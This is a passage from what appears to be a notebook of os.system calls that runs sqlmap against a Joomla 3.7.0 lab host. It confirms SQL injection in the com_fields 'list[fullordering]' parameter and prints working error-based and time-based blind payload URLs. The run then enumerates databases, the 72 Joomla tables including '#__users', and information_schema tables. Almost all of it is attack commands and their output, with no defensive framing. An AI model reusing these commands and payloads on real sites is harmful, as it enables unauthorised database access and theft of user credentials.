# [13:36:40] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:36:40] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=87571f5c608...ae884f6d79'). Do you want to use those [Y/n] Y
# [13:36:42] [INFO] checking if the target is protected by some kind of WAF/IPS
# [13:36:43] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
# are you sure that you want to continue with further target testing? [Y/n] Y
# [13:36:43] [WARNING] please consider usage of tamper scripts (option '--tamper')
# [13:36:43] [INFO] testing if the target URL content is stable
# [13:36:43] [WARNING] URI parameter '#1*' does not appear to be dynamic
# [13:36:44] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
# [13:36:44] [INFO] testing for SQL injection on URI parameter '#1*'
# it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
# for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
# [13:36:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
# [13:36:45] [WARNING] reflective value(s) found and filtering out
# [13:36:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
# [13:36:50] [INFO] testing 'Generic inline queries'
# [13:36:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
# [13:37:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
# [13:37:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
# [13:37:45] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
# [13:38:14] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
# [13:38:47] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
# [13:39:16] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
# [13:39:50] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
# [13:40:17] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
# [13:40:49] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
# [13:41:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
# [13:41:16] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
# [13:41:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
# [13:41:18] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
# [13:41:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
# [13:41:19] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
# [13:41:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
# [13:41:22] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
# [13:41:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
# [13:41:23] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
# [13:41:23] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
# [13:41:43] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
# [13:41:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
# [13:42:06] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
# [13:42:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
# [13:42:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
# [13:43:16] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
# [13:43:38] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
# [13:44:00] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:44:20] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:44:42] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [13:45:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
# [13:45:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [13:45:41] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
# [13:46:01] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
# [13:46:20] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
# [13:46:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
# [13:46:49] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
# [13:47:04] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
# [13:47:04] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
# [13:47:05] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
# [13:47:05] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
# [13:47:05] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable
# [13:47:06] [INFO] testing 'MySQL inline queries'
# [13:47:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
# [13:47:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
# [13:47:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
# [13:47:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
# [13:47:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
# [13:47:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
# [13:47:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
# [13:47:09] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
# [13:47:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
# [13:47:10] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
# [13:47:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
# [13:47:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
# [13:47:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
# [13:47:11] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
# [13:47:12] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
# [13:47:12] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
# [13:47:13] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
# [13:47:13] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
# [13:47:13] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
# [13:47:14] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
# [13:47:14] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
# [13:47:15] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
# [13:47:15] [INFO] testing 'MySQL AND time-based blind (ELT)'
# [13:47:16] [INFO] testing 'MySQL OR time-based blind (ELT)'
# [13:47:16] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
# [13:47:16] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
# [13:47:17] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
# [13:47:17] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
# [13:47:18] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
# [13:47:18] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
# [13:47:29] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable
# [13:47:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
# [13:47:29] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
# [13:47:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
# [13:47:45] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
# [13:47:54] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
# [13:48:02] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
# [13:48:10] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
# [13:48:17] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
# [13:48:26] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
# [13:48:35] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
# [13:48:44] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
# [13:48:53] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
# URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
# sqlmap identified the following injection point(s) with a total of 1754 HTTP(s) requests:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:49:03] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:49:05] [WARNING] HTTP error codes detected during run:
# 500 (Internal Server Error) - 1728 times
# [13:49:05] [INFO] fetched data logged to text files under '/home/jovyan/.sqlmap/output/joomla370'
# [13:49:05] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:49:05 /2022-04-20/
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbs')
# Out:
#         ___
#        __H__
#  ___ ___["]_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  [)]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:49:07 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:49:07] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:49:07] [INFO] resuming back-end DBMS 'mysql'
# [13:49:07] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=98af1de8b01...9569c1ef7b'). Do you want to use those [Y/n] Y
# [13:49:09] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:49:09] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:49:09] [INFO] fetching database names
# [13:49:10] [INFO] retrieved: 'information_schema'
# [13:49:11] [INFO] retrieved: 'ead_bd'
# available databases [2]:
# [*] ead_bd
# [*] information_schema
#
# [13:49:12] [WARNING] HTTP error codes detected during run:
# 500 (Internal Server Error) - 3 times
# [13:49:12] [INFO] fetched data logged to text files under '/home/jovyan/.sqlmap/output/joomla370'
# [13:49:12] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:49:12 /2022-04-20/
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd --tables')
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:49:13 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:49:13] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:49:13] [INFO] resuming back-end DBMS 'mysql'
# [13:49:13] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=b9712321fa5...82d316aa7f'). Do you want to use those [Y/n] Y
# [13:49:15] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:49:15] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:49:15] [INFO] fetching tables for database: 'ead_bd'
# [13:49:16] [INFO] retrieved: '#__messages'
# [13:49:16] [INFO] retrieved: '#__finder_links_termsf'
# [13:49:17] [INFO] retrieved: '#__modules_menu'
# [13:49:17] [INFO] retrieved: '#__categories'
# [13:49:18] [INFO] retrieved: '#__finder_links_termsa'
# [13:49:19] [INFO] retrieved: '#__tags'
# [13:49:19] [INFO] retrieved: '#__finder_terms_common'
# [13:49:20] [INFO] retrieved: '#__postinstall_messages'
# [13:49:20] [INFO] retrieved: '#__menu'
# [13:49:21] [INFO] retrieved: '#__fields'
# [13:49:21] [INFO] retrieved: '#__user_keys'
# [13:49:22] [INFO] retrieved: '#__finder_links_terms7'
# [13:49:22] [INFO] retrieved: '#__finder_links_terms6'
# [13:49:23] [INFO] retrieved: '#__overrider'
# [13:49:23] [INFO] retrieved: '#__finder_links_terms5'
# [13:49:24] [INFO] retrieved: '#__session'
# [13:49:24] [INFO] retrieved: '#__schemas'
# [13:49:25] [INFO] retrieved: '#__core_log_searches'
# [13:49:25] [INFO] retrieved: '#__usergroups'
# [13:49:26] [INFO] retrieved: '#__utf8_conversion'
# [13:49:26] [INFO] retrieved: '#__finder_links_termsd'
# [13:49:27] [INFO] retrieved: '#__finder_links_termsc'
# [13:49:27] [INFO] retrieved: '#__finder_tokens'
# [13:49:28] [INFO] retrieved: '#__finder_links_terms0'
# [13:49:28] [INFO] retrieved: '#__assets'
# [13:49:28] [INFO] retrieved: '#__modules'
# [13:49:29] [INFO] retrieved: '#__finder_links_termsb'
# [13:49:30] [INFO] retrieved: '#__ucm_history'
# [13:49:30] [INFO] retrieved: '#__update_sites_extensions'
# [13:49:31] [INFO] retrieved: '#__content_types'
# [13:49:31] [INFO] retrieved: '#__fields_categories'
# [13:49:32] [INFO] retrieved: '#__finder_terms'
# [13:49:32] [INFO] retrieved: '#__messages_cfg'
# [13:49:32] [INFO] retrieved: '#__viewlevels'
# [13:49:33] [INFO] retrieved: '#__contentitem_tag_map'
# [13:49:33] [INFO] retrieved: '#__finder_links_terms1'
# [13:49:34] [INFO] retrieved: '#__banner_tracks'
# [13:49:34] [INFO] retrieved: '#__banner_clients'
# [13:49:35] [INFO] retrieved: '#__associations'
# [13:49:35] [INFO] retrieved: '#__redirect_links'
# [13:49:36] [INFO] retrieved: '#__content'
# [13:49:36] [INFO] retrieved: '#__ucm_content'
# [13:49:37] [INFO] retrieved: '#__finder_links_termse'
# [13:49:37] [INFO] retrieved: '#__finder_links_terms9'
# [13:49:38] [INFO] retrieved: '#__user_notes'
# [13:49:38] [INFO] retrieved: '#__finder_taxonomy_map'
# [13:49:39] [INFO] retrieved: '#__menu_types'
# [13:49:39] [INFO] retrieved: '#__content_frontpage'
# [13:49:40] [INFO] retrieved: '#__finder_links_terms8'
# [13:49:40] [INFO] retrieved: '#__fields_values'
# [13:49:41] [INFO] retrieved: '#__newsfeeds'
# [13:49:42] [INFO] retrieved: '#__finder_filters'
# [13:49:42] [INFO] retrieved: '#__finder_types'
# [13:49:42] [INFO] retrieved: '#__languages'
# [13:49:43] [INFO] retrieved: '#__finder_tokens_aggregate'
# [13:49:44] [INFO] retrieved: '#__update_sites'
# [13:49:44] [INFO] retrieved: '#__finder_taxonomy'
# [13:49:45] [INFO] retrieved: '#__contact_details'
# [13:49:45] [INFO] retrieved: '#__finder_links_terms3'
# [13:49:46] [INFO] retrieved: '#__fields_groups'
# [13:49:46] [INFO] retrieved: '#__finder_links_terms2'
# [13:49:47] [INFO] retrieved: '#__template_styles'
# [13:49:47] [INFO] retrieved: '#__updates'
# [13:49:48] [INFO] retrieved: '#__finder_links_terms4'
# [13:49:48] [INFO] retrieved: '#__banners'
# [13:49:49] [INFO] retrieved: '#__content_rating'
# [13:49:49] [INFO] retrieved: '#__finder_links'
# [13:49:50] [INFO] retrieved: '#__extensions'
# [13:49:50] [INFO] retrieved: '#__user_usergroup_map'
# [13:49:51] [INFO] retrieved: '#__user_profiles'
# [13:49:51] [INFO] retrieved: '#__users'
# [13:49:52] [INFO] retrieved: '#__ucm_base'
# Database: ead_bd
# [72 tables]
# +----------------------------+
# | #__assets                  |
# | #__associations            |
# | #__banner_clients          |
# | #__banner_tracks           |
# | #__banners                 |
# | #__categories              |
# | #__contact_details         |
# | #__content_frontpage       |
# | #__content_rating          |
# | #__content_types           |
# | #__content                 |
# | #__contentitem_tag_map     |
# | #__core_log_searches       |
# | #__extensions              |
# | #__fields_categories       |
# | #__fields_groups           |
# | #__fields_values           |
# | #__fields                  |
# | #__finder_filters          |
# | #__finder_links_terms0     |
# | #__finder_links_terms1     |
# | #__finder_links_terms2     |
# | #__finder_links_terms3     |
# | #__finder_links_terms4     |
# | #__finder_links_terms5     |
# | #__finder_links_terms6     |
# | #__finder_links_terms7     |
# | #__finder_links_terms8     |
# | #__finder_links_terms9     |
# | #__finder_links_termsa     |
# | #__finder_links_termsb     |
# | #__finder_links_termsc     |
# | #__finder_links_termsd     |
# | #__finder_links_termse     |
# | #__finder_links_termsf     |
# | #__finder_links            |
# | #__finder_taxonomy_map     |
# | #__finder_taxonomy         |
# | #__finder_terms_common     |
# | #__finder_terms            |
# | #__finder_tokens_aggregate |
# | #__finder_tokens           |
# | #__finder_types            |
# | #__languages               |
# | #__menu_types              |
# | #__menu                    |
# | #__messages_cfg            |
# | #__messages                |
# | #__modules_menu            |
# | #__modules                 |
# | #__newsfeeds               |
# | #__overrider               |
# | #__postinstall_messages    |
# | #__redirect_links          |
# | #__schemas                 |
# | #__session                 |
# | #__tags                    |
# | #__template_styles         |
# | #__ucm_base                |
# | #__ucm_content             |
# | #__ucm_history             |
# | #__update_sites_extensions |
# | #__update_sites            |
# | #__updates                 |
# | #__user_keys               |
# | #__user_notes              |
# | #__user_profiles           |
# | #__user_usergroup_map      |
# | #__usergroups              |
# | #__users                   |
# | #__utf8_conversion         |
# | #__viewlevels              |
# +----------------------------+
#
# [13:49:52] [WARNING] HTTP error codes detected during run:
# 500 (Internal Server Error) - 73 times
# [13:49:52] [INFO] fetched data logged to text files under '/home/jovyan/.sqlmap/output/joomla370'
# [13:49:52] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:49:52 /2022-04-20/
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd -T "#__users" --columns')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [']     | .'| . |
# |___|_  [']_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:49:53 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:49:54] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:49:54] [INFO] resuming back-end DBMS 'mysql'
# [13:49:54] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=fb59006b5ce...e53e1dcf2d'). Do you want to use those [Y/n] Y
# [13:49:56] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:49:56] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:49:56] [INFO] fetching columns for table '#__users' in database 'ead_bd'
# [13:49:56] [WARNING] unable to retrieve column names for table '#__users' in database 'ead_bd'
# do you want to use common column existence check? [y/N/q] N
# [13:49:56] [WARNING] HTTP error codes detected during run:
# 500 (Internal Server Error) - 1 times
# [13:49:56] [INFO] fetched data logged to text files under '/home/jovyan/.sqlmap/output/joomla370'
# [13:49:56] [WARNING] you haven't updated sqlmap for more than 747 days!!!
#
# [*] ending @ 13:49:56 /2022-04-20/
# 0

# %%
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema --tables')
# Out:
#         ___
#        __H__
#  ___ ___[)]_____ ___ ___  {1.4.4#stable}
# |_ -| . [.]     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:49:58 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:49:59] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:49:59] [INFO] resuming back-end DBMS 'mysql'
# [13:49:59] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla370:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('16ecd03278f46e4a6f358c90f0c01dd3=4bc6d20a39d...5705e5d655'). Do you want to use those [Y/n] Y
# [13:50:01] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
# sqlmap resumed the following injection point(s) from stored session:
# ---
# Parameter: #1* (URI)
#     Type: error-based
#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 2456 FROM(SELECT COUNT(*),CONCAT(0x7178767a71,(SELECT (ELT(2456=2456,1))),0x7171627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
#
#     Type: time-based blind
#     Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
#     Payload: http://joomla370:80/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9446 FROM (SELECT(SLEEP(5)))MVgk)
# ---
# [13:50:01] [INFO] the back-end DBMS is MySQL
# back-end DBMS: MySQL >= 5.0 (MariaDB fork)
# [13:50:01] [INFO] fetching tables for database: 'information_schema'
# [13:50:02] [INFO] retrieved: 'ALL_PLUGINS'
# [13:50:03] [INFO] retrieved: 'APPLICABLE_ROLES'
# [13:50:03] [INFO] retrieved: 'CHARACTER_SETS'
# [13:50:04] [INFO] retrieved: 'CHECK_CONSTRAINTS'
# [13:50:05] [INFO] retrieved: 'COLLATIONS'
# [13:50:06] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
# [13:50:07] [INFO] retrieved: 'COLUMNS'
# [13:50:08] [INFO] retrieved: 'COLUMN_PRIVILEGES'
# [13:50:08] [INFO] retrieved: 'ENABLED_ROLES'
# [13:50:09] [INFO] retrieved: 'ENGINES'
# [13:50:09] [INFO] retrieved: 'EVENTS'
# [13:50:10] [INFO] retrieved: 'FILES'
# [13:50:10] [INFO] retrieved: 'GLOBAL_STATUS'
# [13:50:11] [INFO] retrieved: 'GLOBAL_VARIABLES'
# [13:50:11] [INFO] retrieved: 'KEYWORDS'
# [13:50:12] [INFO] retrieved: 'KEY_CACHES'
# [13:50:12] [INFO] retrieved: 'KEY_COLUMN_USAGE'
# [13:50:13] [INFO] retrieved: 'OPTIMIZER_TRACE'
# [13:50:13] [INFO] retrieved: 'PARAMETERS'
# [13:50:14] [INFO] retrieved: 'PARTITIONS'
# [13:50:14] [INFO] retrieved: 'PLUGINS'
# [13:50:15] [INFO] retrieved: 'PROCESSLIST'
# [13:50:15] [INFO] retrieved: 'PROFILING'
# [13:50:16] [INFO] retrieved: 'REFERENTIAL_CONSTRAINTS'
# [13:50:16] [INFO] retrieved: 'ROUTINES'
# [13:50:17] [INFO] retrieved: 'SCHEMATA'
# [13:50:17] [INFO] retrieved: 'SCHEMA_PRIVILEGES'
# [13:50:18] [INFO] retrieved: 'SESSION_STATUS'
# [13:50:18] [INFO] retrieved: 'SESSION_VARIABLES'
# [13:50:19] [INFO] retrieved: 'STATISTICS'
# [13:50:19] [INFO] retrieved: 'SQL_FUNCTIONS'
# [13:50:20] [INFO] retrieved: 'SYSTEM_VARIABLES'
# [13:50:20] [INFO] retrieved: 'TABLES'
# [13:50:21] [INFO] retrieved: 'TABLESPACES'
# [13:50:21] [INFO] retrieved: 'TABLE_CONSTRAINTS'
# [13:50:22] [INFO] retrieved: 'TABLE_PRIVILEGES'
# [13:50:22] [INFO] retrieved: 'TRIGGERS'
# [13:50:23] [INFO] retrieved: 'USER_PRIVILEGES'
# [13:50:23] [INFO] retrieved: 'VIEWS'
